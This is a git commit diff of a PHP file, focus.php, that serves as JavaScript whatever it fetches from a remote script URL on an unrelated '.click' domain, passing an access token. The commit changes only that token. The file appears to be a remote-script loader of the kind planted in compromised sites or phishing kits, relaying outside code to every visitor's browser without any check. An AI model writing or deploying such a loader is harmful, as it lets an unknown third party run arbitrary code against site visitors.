10ba15ffb138d322dd880e80b03f086b1112bff0
jgarciafonseca16-rgb <jgarciafonseca16@gmail.com>
2025-08-20 16:50:31 +0200

    Update focus.php

--- focus.php
+++ focus.php
@@ -1,4 +1,4 @@
 <?php
 header('Content-Type: application/javascript');
-echo file_get_contents('https://bogota.tusilandia.click/_bogota/script.php?tok=crispi121');
+echo file_get_contents('https://bogota.tusilandia.click/_bogota/script.php?tok=qwert03');
 ?>
